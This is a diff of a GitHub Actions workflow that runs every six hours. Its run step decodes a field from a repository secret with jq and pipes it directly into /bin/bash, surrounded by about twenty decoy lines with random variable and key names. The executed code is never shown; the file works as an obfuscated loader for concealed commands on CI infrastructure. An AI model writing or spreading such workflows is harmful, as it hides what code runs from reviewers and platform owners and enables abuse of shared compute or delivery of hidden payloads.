@@ -2,35 +2,34 @@ name: guzhengqiu3817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 5/6 * * *'
+    - cron: '45 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guzhengqiu3817
         env:
-          xxid8: ${{ secrets.xxid8 }}
+          x9764: ${{ secrets.x9764 }}
         run: |
-          echo $xxid8 | jq -r .fqemm3 | /bin/bash
-          echo $ld9338 | jq -r .ottek1212 | /bin/bash
-          echo $zio815 | jq -r .gxkai852 | /bin/bash
-          echo $xvq7 | jq -r .gvpt78 | /bin/bash
-          echo $y470 | jq -r .r09901 | /bin/bash
-          echo $j2 | jq -r .anilq8923 | /bin/bash
-          echo $qiid87 | jq -r .zyral396 | /bin/bash
-          echo $cis70927 | jq -r .salk1340 | /bin/bash
-          echo $ncc71 | jq -r .agoj041 | /bin/bash
-          echo $hvyc25580 | jq -r .r12564 | /bin/bash
-          echo $uv610 | jq -r .t33961 | /bin/bash
-          echo $lpb1 | jq -r .fduj32615 | /bin/bash
-          echo $wdgqr573 | jq -r .q077 | /bin/bash
-          echo $tcirz7 | jq -r .akayr1 | /bin/bash
-          echo $jj229 | jq -r .yeapv273 | /bin/bash
-          echo $vkn44 | jq -r .yqnnd780 | /bin/bash
-          echo $rh25387 | jq -r .r8 | /bin/bash
-          echo $x7 | jq -r .pw61232 | /bin/bash
-          echo $ucpg57809 | jq -r .ibux2633 | /bin/bash
-          echo $p87982 | jq -r .dkk2 | /bin/bash
+          echo $x9764 | jq -r .tve3 | /bin/bash
+          echo $wh5 | jq -r .u16 | /bin/bash
+          echo $qpxl4 | jq -r .aa83287 | /bin/bash
+          echo $i7 | jq -r .czi00 | /bin/bash
+          echo $ohayd520 | jq -r .o15 | /bin/bash
+          echo $t51 | jq -r .vjyh8051 | /bin/bash
+          echo $ph72 | jq -r .ssjim1 | /bin/bash
+          echo $zbeds3 | jq -r .t2171 | /bin/bash
+          echo $e7 | jq -r .knd79123 | /bin/bash
+          echo $jnr0212 | jq -r .gihd79 | /bin/bash
+          echo $h95326 | jq -r .ju7 | /bin/bash
+          echo $cd6677 | jq -r .zdzn879 | /bin/bash
+          echo $jh35 | jq -r .gbh6372 | /bin/bash
+          echo $qle10563 | jq -r .roeaf7030 | /bin/bash
+          echo $ndwfg622 | jq -r .ez45 | /bin/bash
+          echo $aj0 | jq -r .nj5115 | /bin/bash
+          echo $eycw7332 | jq -r .qm8986 | /bin/bash
+          echo $gehae97522 | jq -r .c2708 | /bin/bash
+          echo $uxd3902 | jq -r .rgi6514 | /bin/bash
 
